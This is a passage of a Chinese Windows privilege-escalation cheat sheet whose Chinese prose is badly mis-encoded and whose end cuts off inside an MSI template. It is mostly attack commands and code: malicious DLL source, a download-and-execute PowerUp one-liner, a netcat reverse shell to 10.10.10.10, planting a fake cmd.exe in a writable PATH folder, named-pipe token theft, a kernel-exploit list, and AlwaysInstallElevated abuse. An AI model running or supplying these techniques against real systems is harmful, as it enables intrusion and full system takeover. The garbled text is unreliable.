ä¸­ç¼–è¾‘ä½†æœªä¿å­˜åˆ°æ–‡ä»¶çš„æ•°æ®ã€‚ PS &gt; Get-Item -path flag.txt -Stream * PS &gt; Get-Content -path flag.txt -Stream Flag LAPS Settings Extract HKLM\Software\Policies\Microsoft Services\AdmPwd from Windows Registry. LAPS Enabled: AdmPwdEnabled LAPS Admin Account Name: AdminAccountName LAPS Password Complexity: PasswordComplexity LAPS Password Length: PasswordLength LAPS Expiration Protection Enabled: PwdExpirationProtectionEnabled è¿›ç¨‹ç›¸å…³ææƒæ–¹å¼ å“ªäº›è¿›ç¨‹åœ¨è¿è¡Œ tasklist /v net start sc query Get-Service Get-Process Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize å“ªäº›è¿›ç¨‹ä»¥ system æƒé™è¿è¡Œ tasklist /v /fi "username eq system" å¦‚æœè¿™äº›è¿›ç¨‹æ‰€åœ¨ç›®å½•ï¼Œæˆ–åŠ è½½çš„ dll æ‰€åœ¨ç›®å½•å¯å†™çš„è¯ï¼Œå¯åˆ©ç”¨ dll åŠ«æŒææƒã€‚ Powershell ç‰ˆæœ¬ REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion æšä¸¾å·²å®‰è£…ç¨‹åº å·²å®‰è£…ç¨‹åºå¯ä½œä¸ºææƒçªç ´ç‚¹ã€‚ Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name æšä¸¾å·²å®‰è£…æœåŠ¡ net start wmic service list brief tasklist /SVC æšä¸¾è®¡åˆ’ä»»åŠ¡ schtasks /query /fo LIST 2&gt;nul | findstr TaskName schtasks /query /fo LIST /v &gt; schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State æšä¸¾è‡ªå¯åŠ¨åº”ç”¨ wmic startup get caption,command reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" åˆ©ç”¨æœåŠ¡æƒé™é”™è¯¯ææƒ ä»¥ç®¡ç†å‘˜/ç³»ç»Ÿèº«ä»½è¿è¡Œä¸”æ–‡ä»¶æƒé™ä¸æ­£ç¡®çš„æœåŠ¡å¯èƒ½å¯¼è‡´ææƒï¼Œæ›¿æ¢è¯¥æ–‡ä»¶æˆ–è€…åŠ«æŒ DLLï¼ˆéœ€è¦å¯å†™æƒé™ï¼‰ï¼Œç„¶åé‡å¯è¯¥æœåŠ¡å³å¯ã€‚ DLL åŠ«æŒ å¯»æ‰¾ DLL åŠ«æŒåˆ©ç”¨ç‚¹ PowerSploit ä¸­çš„ PowerUp è„šæœ¬ï¼šFind-PathDLLHijack PowerUp.ps1 Process Monitor : check for â€œName Not Foundâ€ ç¼–è¯‘æ¶æ„ DLL For x64 compile with: â€œx86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dllâ€ For x86 compile with: â€œi686-w64-mingw32-gcc windows_dll.c -shared -o output.dllâ€ windows_dll.c å†…å®¹ #include &lt;windows.h&gt; BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) { if (dwReason == DLL_PROCESS_ATTACH) { system("cmd.exe /k whoami &gt; C:\\Windows\\Temp\\dll.txt"); ExitProcess(0); } return TRUE; } å¯»æ‰¾æƒé™é…ç½®ä¸å½“çš„ PATH ç›®å½• $ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a &gt;&gt; c:\windows\temp\permissions.txt $ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a" $ sc query state=all | findstr "SERVICE_NAME:" &gt;&gt; Servicenames.txt FOR /F %i in (Servicenames.txt) DO echo %i type Servicenames.txt FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i &gt;&gt; services.txt FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" &gt;&gt; path.txt åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œç¨‹åºå¯èƒ½è‡ªä¸»åœ°åŠ è½½æŸäº›è·¯å¾„çš„ dllï¼Œæ­¤æ—¶å°±éœ€è¦é€†å‘ç‰¹å®šçš„åº”ç”¨æ‰å¯ä»¥åˆ¤æ–­æ˜¯å¦å¯ä»¥è¿›è¡Œ DLL åŠ«æŒã€‚ å‚è€ƒï¼š Powershell ææƒæ¡†æ¶-Powerupâ€”â€”å¹³å¿ƒè€Œè®ºï¼Œè¿™ä¸ªææƒå·¥å…·è¿˜æ˜¯å¾ˆå¥½ç”¨çš„ï¼Œçœ‹åé¢å®æˆ˜ä¾‹å­ - bonelee - åšå®¢å›­ PATH è·¯å¾„å¯å†™ ä¸‹é¢çš„å‘½ä»¤å¯ä»¥å¯¹æœåŠ¡çš„ path è·¯è¿›å…·å¤‡çš„æƒé™è¿›è¡Œæ’æŸ¥ã€‚ $ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a &gt;&gt; c:\windows\temp\permissions.txt $ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a" $ sc query state=all | findstr "SERVICE_NAME:" &gt;&gt; Servicenames.txt FOR /F %i in (Servicenames.txt) DO echo %i type Servicenames.txt FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i &gt;&gt; services.txt FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" &gt;&gt; path.txt ä¸¤ç»„å‘½ä»¤éƒ½å¯ä»¥ç”¨ï¼Œä½†ä¼šç”Ÿæˆæ–‡ä»¶ã€‚ æˆ–è€…ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨ msf ä¸­çš„ expï¼š exploit/windows/local/service_permissions windows 10 - CVE-2019-1322 UsoSvc Windows XP SP1 - upnphost åˆ©ç”¨ Linux å­ç³»ç»Ÿææƒ å‡­å€Ÿ root æƒé™ï¼ŒWindows Subsystem for Linux (WSL) å…è®¸ç”¨æˆ·åœ¨ä»»ä½•ç«¯å£ä¸Šåˆ›å»ºç»‘å®š shellï¼ˆæ— éœ€æå‡ï¼‰ã€‚ ä¸çŸ¥é“ root å¯†ç ï¼Ÿ æ²¡é—®é¢˜ï¼Œåªéœ€å°†é»˜è®¤ç”¨æˆ·è®¾ç½®ä¸º root W/.exe â€“default-user root å³å¯ã€‚ ç°åœ¨å¯åŠ¨æ‚¨çš„ç»‘å®š shell æˆ–åå‘æ“ä½œã€‚ Windows å­ç³»ç»Ÿçš„æ–‡ä»¶ç›®å½•ä¹Ÿæ˜¯å¯ä»¥ç›´æ¥æŸ¥çœ‹çš„ï¼š C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\ åˆ©ç”¨æœªåŠ å¼•å·çš„æœåŠ¡è·¯å¾„ææƒ åˆ©ç”¨æ¡ä»¶ï¼š æœåŠ¡çš„è·¯å¾„å­˜åœ¨æ— å¼•å·ä¸”åŒ…å«ç©ºæ ¼æˆ–å…¶ä»–åˆ†éš”ç¬¦ã€‚ ä¸Šçº§è·¯å¾„å¯å†™ã€‚ Microsoft Windows æ— å¼•å·æœåŠ¡è·¯å¾„æšä¸¾æ¼æ´ã€‚ æ‰€æœ‰ Windows æœåŠ¡éƒ½æœ‰å…¶å¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„ã€‚ å¦‚æœè¯¥è·¯å¾„æœªåŠ å¼•å·ä¸”åŒ…å«ç©ºæ ¼æˆ–å…¶ä»–åˆ†éš”ç¬¦ï¼Œåˆ™æœåŠ¡å°†é¦–å…ˆå°è¯•è®¿é—®çˆ¶è·¯å¾„ä¸­çš„èµ„æºã€‚ ä¾‹å¦‚ï¼š For C:\Program Files\something\legit.exe, Windows will try the following paths first: C:\Program.exe C:\Program Files.exe å¦‚æœè¿™ç±»è·¯å¾„å¯å†™ï¼Œå³å¯åŠ«æŒè¯¥æœåŠ¡çš„ exeï¼Œå¦‚æœè¯¥æœåŠ¡å…·å¤‡é«˜æƒé™ï¼Œåˆ™å¯ææƒã€‚ æœç´¢æ­¤ç±»æœåŠ¡ã€‚ wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """ wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" |findstr /i /v """ gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name æ¼æ´åˆ©ç”¨ï¼š Metasploit exploit : exploit/windows/local/trusted_service_path PowerUp exploit # find the vulnerable application C:\&gt; powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1'); Invoke-AllChecks" ... [*] Checking for unquoted service paths... ServiceName : BBSvc Path : C:\Program Files\Microsoft\Bing Bar\7.1\BBSvc.exe StartName : LocalSystem AbuseFunction : Write-ServiceBinary -ServiceName 'BBSvc' -Path &lt;HijackPath&gt; ... # automatic exploit Invoke-ServiceAbuse -Name [SERVICE_NAME] -Command "..\..\Users\Public\nc.exe 10.10.10.10 4444 -e cmd.exe" åˆ©ç”¨ PATH æ‹¦æˆªææƒ åˆ©ç”¨æ¡ä»¶ï¼š PATH è·¯å¾„ä¸­å­˜åœ¨å¯å†™è·¯å¾„ å¯å†™æ–‡ä»¶å¤¹ä½äºåŒ…å«åˆæ³•å¯æ‰§è¡Œæ–‡ä»¶çš„æ–‡ä»¶å¤¹ä¹‹å‰ã€‚ ç¤ºä¾‹ï¼š ps ä¸­æ‰§è¡Œå¦‚ä¸‹çš„å‘½ä»¤æŸ¥çœ‹ PATH $env:Path å‡è®¾è¾“å‡ºä¸º:C:\Program Files\nodejs\;C:\WINDOWS\system32 æ£€æŸ¥ C:\Program Files\nodejs æ–‡ä»¶å¤¹çš„æƒé™å‘ç°å¯å†™ã€‚ icacls.exe "C:\Program Files\nodejs\" ç”±äº nodejs åœ¨ system32 ä¹‹å‰ï¼Œå› æ­¤å¯ä»¥å‘ nodejs æ–‡ä»¶å¤¹ä¸­å†™å…¥ cmd.exeï¼Œä¸‹æ¬¡ç”¨æˆ·å†æ‰§è¡Œ cmd æ—¶ï¼Œåˆ™ä¼šæ‰§è¡Œ nodejs ä¸­çš„ cmd.exe copy evil-file.exe "C:\Program Files\nodejs\cmd.exe" åˆ©ç”¨ Name Pipe ææƒ åˆ©ç”¨æœåŠ¡è‡ªèº«çš„æ¼æ´æˆ–åŠŸèƒ½ æ‰¾åˆ°å­˜åœ¨å‘½åç®¡é“çš„æœåŠ¡ï¼ŒæŒ–æ˜æœåŠ¡æ¼æ´æˆ–å¯ç”¨åŠŸèƒ½ï¼Œåˆ©ç”¨ Name Pipe æ“ä½œè¿™äº›åŠŸèƒ½æˆ–ç›´æ¥åˆ©ç”¨æ¼æ´è·å–åˆ°é«˜æƒé™ã€‚ åˆ©ç”¨æ­¥éª¤ï¼š Find named pipes: [System.IO.Directory]::GetFiles(â€œ\.\pipe") Check named pipes DACL: pipesec.exe Reverse engineering software Send data throught the named pipe : program.exe &gt;\.\pipe\StdOutPipe 2&gt;\.\pipe\StdErrPipe meterpreter ä¸­çš„ getsystem æœ‰ä»£è¡¨æ€§çš„ EXP å¦‚ meterpreter ä¸­çš„ getsystem å‘½ä»¤ã€‚è¯¥æŠ€æœ¯çš„æ ¸å¿ƒåœ¨äºå¯¹ ImpersonateNamedPipeClient API çš„åˆ©ç”¨ï¼Œé€šè¿‡å‘½åç®¡é“çš„æœåŠ¡ç«¯è¿›ç¨‹æ¨¡ä»¿å®¢æˆ·ç«¯è¿›ç¨‹çš„è®¿é—®ä»¤ç‰Œï¼Œè·å– SYSTEM æƒé™ã€‚å½“ç„¶ï¼Œæƒ³è°ƒç”¨å®ƒï¼Œå‰ææ˜¯è¿›ç¨‹å…·å¤‡ SeImpersonatePrivilege çš„æƒé™ï¼Œè€Œè¿™é€šå¸¸æ„å‘³ç€æˆ‘ä»¬å·²ç»æ˜¯ Admin ç”¨æˆ·äº†ã€‚ åˆ©ç”¨ç»†èŠ‚ï¼š 1) getsystem æ–°å»ºä¸€ä¸ªçº¿ç¨‹åˆ›å»ºå‘½åç®¡é“å¹¶ç­‰å¾…æœåŠ¡å‘æ¥çš„è¿æ¥ (æœåŠ¡ç«¯) 2) getsystem åˆ›å»ºäº†ä¸€ä¸ªä»¥ SYSTEM æƒé™è¿è¡Œçš„ Windows æœåŠ¡ï¼Œè¯¥æœåŠ¡ä¼šå‘å‘½åç®¡é“å‘èµ·è¿æ¥ (å®¢æˆ·ç«¯) 3) å¯åŠ¨è¯¥æœåŠ¡ï¼Œå‘ç›®æ ‡å‘½åç®¡é“å‘èµ·è¿æ¥ (å®¢æˆ·ç«¯ -&gt; æœåŠ¡ç«¯) 4) è¯¥è¿›ç¨‹(æœåŠ¡ç«¯)æ¥æ”¶è¿æ¥ï¼Œè°ƒç”¨ ImpersonateNamedPipeClientï¼Œä»è€Œæ¨¡ä»¿äº† SYSTEM æƒé™çš„è®¿é—®ä»¤ç‰Œ 5) å®Œæˆææƒè¿‡ç¨‹åï¼Œåœæ­¢å¹¶åˆ é™¤è¯¥æœåŠ¡ å‚è€ƒ èµ°è¿›Windowsä¸­çš„ææƒè¡Œä¸º-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° PrintSpoofer å‘½åç®¡é“ææƒçš„åŸç†å¤§å¤šç±»ä¼¼ï¼Œä¸€èˆ¬æ˜¯è¯±ä½¿ system æƒé™çš„æœåŠ¡è®¿é—®æˆ‘ä»¬æŒ‡å®šçš„å‘½åç®¡é“ã€‚ Windows çš„ MS-RPRN åè®®ç”¨äºæ‰“å°å®¢æˆ·æœºå’Œæ‰“å°æœåŠ¡å™¨ä¹‹é—´çš„é€šä¿¡ï¼Œé»˜è®¤æƒ…å†µä¸‹å¯ç”¨ã€‚åŒæ—¶ï¼ŒPrint Spooler æœåŠ¡çš„ RPC æ¥å£æš´éœ²åœ¨å‘½åç®¡é“ï¼š\.\pipe\spoolss ä¸­ï¼Œè¯¥æœåŠ¡é»˜è®¤å¼€å¯ã€‚ MS-RPRN åè®®å®šä¹‰çš„ RpcRemoteFindFirstPrinterChangeNotificationEx() è°ƒç”¨åˆ›å»ºä¸€ä¸ªè¿œç¨‹æ›´æ”¹é€šçŸ¥å¯¹è±¡ï¼Œè¯¥å¯¹è±¡ç›‘è§†å¯¹æ‰“å°æœºå¯¹è±¡çš„æ›´æ”¹ï¼Œå¹¶å°†æ›´æ”¹é€šçŸ¥å‘é€åˆ°æ‰“å°å®¢æˆ·ç«¯ã€‚ DWORD RpcRemoteFindFirstPrinterChangeNotificationEx( /* [in] */ PRINTER_HANDLE hPrinter, /* [in] */ DWORD fdwFlags, /* [in] */ DWORD fdwOptions, /* [unique][string][in] */ wchar_t *pszLocalMachine, /* [in] */ DWORD dwPrinterLocal, /* [unique][in] */ RPC_V2_NOTIFY_OPTIONS *pOptions) å…¶ä¸­ pszLocalMachine æ˜¯æŒ‡å‘è¡¨ç¤ºå®¢æˆ·ç«¯è®¡ç®—æœºåç§°çš„å­—ç¬¦ä¸²çš„æŒ‡é’ˆï¼Œéœ€è¦ä¼ é€’ä¸€ä¸ª UNC è·¯å¾„ï¼Œä¼ é€’ \127.0.0.1 æ—¶ï¼ŒæœåŠ¡å™¨ä¼šè®¿é—® \127.0.0.1\pipe\spoolssï¼Œä½†è¿™ä¸ªç®¡é“å·²ç»è¢«ç³»ç»Ÿæ³¨å†Œäº†ï¼Œå¹¶ç”± NT AUTHORITY\SYSTEM æ§åˆ¶ã€‚ é‚£ä¹ˆä¸‹ä¸€æ­¥å°±æ˜¯è¦æƒ³åŠæ³•æŠŠè¿™ä¸ªè¯·æ±‚è®©æˆ‘ä»¬å‡†å¤‡å¥½çš„æ¶æ„ç®¡é“æ¥æ”¶ã€‚ è€ƒè™‘åˆ° UNC è·¯å¾„çš„æ€§è´¨ï¼Œå¦‚æœä¸»æœºååŒ…å« /ï¼Œå®ƒå°†é€šè¿‡è·¯å¾„æ£€æŸ¥ï¼Œä½†çœŸæ­£è¿æ¥çš„æ—¶å€™ä¼šè½¬åŒ–ä¸º \ ã€‚é‚£ä¹ˆï¼Œå¦‚æœä¼ é€’ä¸€ä¸ª \127.0.0.1/pipe/fooï¼Œæ£€æŸ¥æ—¶ä¼šè®¤ä¸º 127.0.0.1/pipe/foo æ˜¯ä¸€ä¸ªä¸»æœºåï¼Œéšååœ¨è¿æ¥ named pipe æ—¶ä¼šå¯¹å‚æ•°åšæ ‡å‡†åŒ–ï¼Œäºæ˜¯å°±ä¼šè¿æ¥ \127.0.0.1\pipe\foo\pipe\spoolssï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±å¯ä»¥æŠŠä¸»æœºåæ”¹ä¸º \127.0.0.1/pipe/foo å¹¶æ³¨å†Œè¿™ä¸ª named pipe ä»è€Œçªƒå– client çš„ tokenã€‚ åˆ©ç”¨å·¥å…·ï¼š itm4n/PrintSpoofer: Abusing impersonation privileges through the â€œPrinter Bugâ€ åˆ©ç”¨å†…æ ¸æ¼æ´ææƒ å¯å‚è€ƒï¼šhttps://github.com/SecWiki/windows-kernel-exploits CVE-2021-33739 [Microsoft DWM Core Library Elevation of Privilege Vulnerability] (Windows 10, 20) CVE-2021-1732 [Windows Win32k Elevation of Privilege Vulnerability] (Windows 10, 2019/20H2) CVE-2020-0787 [Windows Background Intelligent Transfer Service Elevation of Privilege Vulnerability] (Windows 7/8/10, 2008/2012- 2016/2019) CVE-2020-0796 [A remote code execution vulnerability exists in the way that the Microsoft Server Message Block 3.1.1 (SMBv3)- protocol handles certain requests, aka â€˜Windows SMBv3 Client/Server Remote Code Execution Vulnerabilityâ€™] (Windows 1903/1909) CVE-2019-1458 [An elevation of privilege vulnerability exists in Windows when the Win32k component fails to properly handle- objects in memory] (Windows 7/8/10/2008/2012/2016) CVE-2019-0803 [An elevation of privilege vulnerability exists in Windows when the Win32k component fails to properly handle- objects in memory] (Windows 7/8/10/2008/2012/2016/2019) CVE-2018-8639 [An elevation of privilege vulnerability exists in Windows when the Win32k component fails to properly handle- objects in memory] (Windows 7/8/10/2008/2012/2016) CVE-2018-1038 [Windows Kernel Elevation of Privilege Vulnerability] (Windows 7 SP1/Windows Server 2008 R2 SP1) CVE-2018-0743 [Windows Subsystem for Linux Elevation of Privilege Vulnerability] (Windows 10 version 1703/Windows 10 version 1709- Windows Server version 1709) CVE-2018-8453 [An elevation of privilege vulnerability in Windows Win32k component] (&gt;= windows 8.1) CVE-2018-8440 [Windows ALPC Elevation of Privilege Vulnerability] (windows 7/8.1/10/2008/2012/2016) MS17-017 ã€€[KB4013081]ã€€ã€€[GDI Palette Objects Local Privilege Escalation]ã€€ã€€(windows 7/8) CVE-2017-8464 ã€€[LNK Remote Code Execution Vulnerability]ã€€ã€€(windows 10/8.1/7/2016/2010/2008) CVE-2017-0213 ã€€[Windows COM Elevation of Privilege Vulnerability]ã€€ã€€(windows 10/8.1/7/2016/2010/2008) CVE-2018-0833 [SMBv3 Null Pointer Dereference Denial of Service] (Windows 8.1/Server 2012 R2) CVE-2018-8120 [Win32k Elevation of Privilege Vulnerability] (Windows 7 SP1/2008 SP2,2008 R2 SP1) MS17-010 ã€€[KB4013389]ã€€ã€€[Windows Kernel Mode Drivers]ã€€ã€€(windows 7/2008/2003/XP) MS16-135 ã€€[KB3199135]ã€€ã€€[Windows Kernel Mode Drivers]ã€€ã€€(2016) MS16-111 ã€€[KB3186973]ã€€ã€€[kernel api]ã€€ã€€(Windows 10 10586 (32/64)/8.1) MS16-098 ã€€[KB3178466]ã€€ã€€[Kernel Driver]ã€€ã€€(Win 8.1) MS16-075 ã€€[KB3164038]ã€€ã€€[Hot Potato]ã€€ã€€(2003/2008/7/8/2012) MS16-034 ã€€[KB3143145]ã€€ã€€[Kernel Driver]ã€€ã€€(2008/7/8/10/2012) MS16-032 ã€€[KB3143141]ã€€ã€€[Secondary Logon Handle]ã€€ã€€(2008/7/8/10/2012) MS16-016 ã€€[KB3136041]ã€€ã€€[WebDAV]ã€€ã€€(2008/Vista/7) MS16-014 ã€€[K3134228]ã€€ã€€[remote code execution]ã€€ã€€(2008/Vista/7) MS15-097 ã€€[KB3089656]ã€€ã€€[remote code execution]ã€€ã€€(win8.1/2012) MS15-076 ã€€[KB3067505]ã€€ã€€[RPC]ã€€ã€€(2003/2008/7/8/2012) MS15-077 ã€€[KB3077657]ã€€ã€€[ATM]ã€€ã€€(XP/Vista/Win7/Win8/2000/2003/2008/2012) MS15-061 ã€€[KB3057839]ã€€ã€€[Kernel Driver]ã€€ã€€(2003/2008/7/8/2012) MS15-051 ã€€[KB3057191]ã€€ã€€[Windows Kernel Mode Drivers]ã€€ã€€(2003/2008/7/8/2012) MS15-015 ã€€[KB3031432]ã€€ã€€[Kernel Driver]ã€€ã€€(Win7/8/8.1/2012/RT/2012 R2/2008 R2) MS15-010 ã€€[KB3036220]ã€€ã€€[Kernel Driver]ã€€ã€€(2003/2008/7/8) MS15-001 ã€€[KB3023266]ã€€ã€€[Kernel Driver]ã€€ã€€(2008/2012/7/8) MS14-070 ã€€[KB2989935]ã€€ã€€[Kernel Driver]ã€€ã€€(2003) MS14-068 ã€€[KB3011780]ã€€ã€€[Domain Privilege Escalation]ã€€ã€€(2003/2008/2012/7/8) MS14-058 ã€€[KB3000061]ã€€ã€€[Win32k.sys]ã€€ã€€(2003/2008/2012/7/8) MS14-066 ã€€[KB2992611]ã€€ã€€[Windows Schannel Allowing remote code execution] (VistaSP2/7 SP1/8/Windows 8.1/2003 SP2/2008 SP2/2008 R2- SP1/2012/2012 R2/Windows RT/Windows RT 8.1) MS14-040 ã€€[KB2975684]ã€€ã€€[AFD Driver]ã€€ã€€(2003/2008/2012/7/8) MS14-002 ã€€[KB2914368]ã€€ã€€[NDProxy]ã€€ã€€(2003/XP) MS13-053 ã€€[KB2850851]ã€€ã€€[win32k.sys]ã€€ã€€(XP/Vista/2003/2008/win 7) MS13-046 ã€€[KB2840221]ã€€ã€€[dxgkrnl.sys]ã€€ã€€(Vista/2003/2008/2012/7) MS13-005 ã€€[KB2778930]ã€€ã€€[Kernel Mode Driver]ã€€ã€€(2003/2008/2012/win7/8) MS12-042 ã€€[KB2972621]ã€€ã€€[Service Bus]ã€€ã€€(2008/2012/win7) MS12-020 ã€€[KB2671387]ã€€ã€€[RDP]ã€€ã€€(2003/2008/7/XP) MS11-080 ã€€[KB2592799]ã€€ã€€[AFD.sys]ã€€ã€€(2003/XP) MS11-062 ã€€[KB2566454]ã€€ã€€[NDISTAPI]ã€€ã€€(2003/XP) MS11-046 ã€€[KB2503665]ã€€ã€€[AFD.sys]ã€€ã€€(2003/2008/7/XP) MS11-011 ã€€[KB2393802]ã€€ã€€[kernel Driver]ã€€ã€€(2003/2008/7/XP/Vista) MS10-092 ã€€[KB2305420]ã€€ã€€[Task Scheduler]ã€€ã€€(2008/7) MS10-065 ã€€[KB2267960]ã€€ã€€[FastCGI]ã€€ã€€(IIS 5.1, 6.0, 7.0, and 7.5) MS10-059 ã€€[KB982799]ã€€ã€€ [ACL-Churraskito]ã€€ã€€(2008/7/Vista) MS10-048 ã€€[KB2160329]ã€€ã€€[win32k.sys]ã€€ã€€(XP SP2 &amp; SP3/2003 SP2/Vista SP1 &amp; SP2/2008 Gold &amp; SP2 &amp; R2/Win7) MS10-015 ã€€[KB977165]ã€€ã€€ [KiTrap0D]ã€€ã€€(2003/2008/7/XP) MS10-012 ã€€[KB971468]ã€€ã€€[SMB Client Trans2 stack overflow]ã€€ã€€(Windows 7/2008R2) MS09-050 ã€€[KB975517]ã€€ã€€ [Remote Code Execution]ã€€ã€€(2008/Vista) MS09-020 ã€€[KB970483]ã€€ã€€ [IIS 6.0]ã€€ã€€(IIS 5.1 and 6.0) MS09-012 ã€€[KB959454]ã€€ã€€ [Chimichurri]ã€€ã€€(Vista/win7/2008/Vista) MS08-068 ã€€[KB957097]ã€€ã€€ [Remote Code Execution]ã€€ã€€(2000/XP) MS08-067 ã€€[KB958644]ã€€ã€€ [Remote Code Execution]ã€€ã€€(Windows 2000/XP/Server 2003/Vista/Server 2008) MS08-066 ã€€[KB956803]ã€€ã€€ [AFD.sys]ã€€ã€€(Windows 2000/XP/Server 2003) MS08-025 ã€€[KB941693]ã€€ã€€ [Win32.sys]ã€€ã€€(XP/2003/2008/Vista) MS06-040 ã€€[KB921883]ã€€ã€€ [Remote Code Execution]ã€€ã€€(2003/xp/2000) MS05-039 ã€€[KB899588]ã€€ã€€ [PnP Service]ã€€ã€€(Win 9X/ME/NT/2000/XP/2003) MS03-026 ã€€[KB823980]ã€€ã€€ [Buffer Overrun In RPC Interface]ã€€ã€€(/NT/2000/XP/2003) åˆ©ç”¨ Microsoft Windows Installer ææƒ AlwaysInstallElevated æ³¨å†Œè¡¨é¡¹é”™è¯¯é…ç½® windows æœ‰ä¸€ä¸ªç³»ç»Ÿè¿›ç¨‹ MSIEXECï¼Œç”¨äºå®‰è£… Windows Installer å®‰è£…åŒ…ï¼ŒAlwaysInstallElevated æ˜¯ä¸€ä¸ªç»„ç­–ç•¥é…ç½®ï¼Œå¦‚æœå¯ç”¨ï¼Œé‚£ä¹ˆå°†å…è®¸æ™®é€šç”¨æˆ·ä»¥ SYSTEM æƒé™è¿è¡Œ msi æ–‡ä»¶è¿›è¡Œå®‰è£…ã€‚å¦‚æœå¯¹æ–¹æœºå™¨æ°å¥½å¼€å¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨æ­¤ç¼ºé™·ææƒã€‚ æ³¨å†Œè¡¨æŸ¥è¯¢, å¦‚æœä¸¤ä¸ªæŸ¥è¯¢éƒ½è¿”å›å€¼ 0x1ï¼Œåˆ™ä¸ºç”¨æˆ·å’Œè®¡ç®—æœºå¯ç”¨äº† AlwaysInstallElevatedï¼Œè¡¨æ˜ç³»ç»Ÿå®¹æ˜“å—åˆ°æ”»å‡»ã€‚ # shell reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated # ps Get-ItemProperty HKLM\Software\Policies\Microsoft\Windows\Installer Get-ItemProperty HKCU\Software\Policies\Microsoft\Windows\Installer æ¼æ´åˆ©ç”¨ï¼š MSF çš„ exploit/windows/local/always_install_elevate æ¨¡å—å¯ä»¥è‡ªåŠ¨å®Œæˆææƒæ“ä½œï¼Œä¼šåˆ›å»ºä¸€ä¸ªéšæœºæ–‡ä»¶åçš„ msi æ–‡ä»¶ï¼Œå¹¶åœ¨ææƒæˆåŠŸååˆ é™¤æ­¤maiæ–‡ä»¶ï¼Œæ”»å‡»æˆåŠŸä¼šè¿”å› system æƒé™ä¼šè¯ getuid use exploit/windows/local/always_install_elevated set session 4 run PowerUP åˆ©ç”¨ æ£€æŸ¥æ³¨å†Œè¡¨çš„è®¾ç½®ï¼š powershell -exec bypass -Command "&amp; {import-module .\powerup.ps1; get-registryalwaysinstallelevated}" ç”Ÿæˆæ–°çš„è´¦æˆ·ï¼š powershell -exec bypass -Command "&amp; {import-module .\powerup.ps1; write-useraddmsi}" Metasploitå¯ä»¥ç”Ÿæˆ MSI ç±»å‹çš„è½½è·ï¼Œä½†å¾ˆå®¹æ˜“è¢« AV/EDR æ‰€æ£€æµ‹ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨åˆ›å»º MSI åŒ…è£¹æ–‡ä»¶ã€‚ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å·¥å…· wix (https://github.com/wixtoolset/wix3) æ¥å°†åŒ…å«äºŒè¿›åˆ¶æ–‡ä»¶æˆ–è€…ä»»æ„å‘½ä»¤çš„æ¨¡æ¿ (https://github.com/KINGSABRI/MSI-AlwaysInstallElevated) è¿›è¡Œæ‰“åŒ…ç„¶åå®‰è£…ã€‚ æˆ‘ä»¬å¯ä»¥ç›´æ¥å°†è¦è¿è¡Œçš„è½½è·æˆ–è€…å‘½ä»¤åŒ…å«åœ¨é‡Œé¢ï¼Œæˆ‘ä»¬å°è¯•æ‰§è¡Œæ·»åŠ æ–°ç”¨æˆ·çš„å‘½ä»¤ï¼Œæ¨¡æ¿å†…å®¹å¦‚ä¸‹ï¼š &lt;Wix xmlns="http://schemas.microsoft.com/wix/2006/wi"&gt; &lt;Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="23e23deeqwddeweqwde" Version="0.0.1" Manufacturer="Test1" Language="1033"&gt; &lt;Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package" /&gt; &lt;Media Id='1' /&gt; &lt;Directory Id="TARGETDIR" Name="SourceDir"&gt; &lt;Directory Id="ProgramFilesFolder"&gt; &lt;Directory Id="INSTALLLOCATION" Name="Example"&gt; &lt;Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222" KeyPath="yes"&gt;&lt;/Component&gt; &lt;/Directory&gt; 